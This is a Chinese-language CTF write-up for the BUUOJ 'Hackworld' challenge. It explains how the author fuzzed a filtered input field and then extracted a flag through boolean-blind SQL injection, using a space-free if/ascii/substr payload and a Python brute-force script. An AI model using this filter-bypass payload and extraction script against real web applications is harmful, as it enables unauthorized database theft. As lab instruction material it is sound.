### buuoj_[CISCN2019 华北赛区]Hackworld

这个题首先随便输入几个数据，一共有一下几种输出

```
id=1
Hello, glzjin wants a girlfriend.
id=2
Do you want to be my girlfriend?
id=any other number
Error Occured When Fetch Result.
id=单引号 双引号 括号等	
bool(false) 
id=空格	#应该还有一些没有试出来，尝试fuzz一下
SQL Injection Checked.
```

fuzz 一下，初步估计

![](https://pic.imgdb.cn/item/611bb46d4907e2d39c7a4f7b.jpg)

or and union 空格 等等，都被过滤了，只有select from还有括号没被过滤，所以考虑使用函数

首先构造一下

```
if(ascii(substr((select(flag)from(flag)),0,1))=32,1,2)
```

可以看到返回了

```
Do you want to be my girlfriend?
```

那么证明这个方法是可行的，所以接下来就可以写脚本了

```python
import requests
import string

x = string.printable	#可打印的字符
flag = ""
url = "http://3a2a7f40-4a3b-4ae1-ad8c-8a7b504d7618.node4.buuoj.cn:81/index.php"
payload={
    "id" : ""
}
for i in range(0,60):	#长度，粗略估计flag长度最多不过60
    for j in x:
        #下面通过修改两个%s处的值，穷举出来
        payload["id"] = "if(ascii(substr((select(flag)from(flag)),%s,1))=%s,1,2)"%(str(i),ord(j))
        s = requests.post(url,data=payload)
        #这里，如果有hello说明返回的1，如果返回2的话，flag的值是一堆01010.。。。
        if "Hello" in s.text:
            flag += j
            print(flag)
            break
    if flag.endswith('}') :
        break
print(flag)
```

获得flag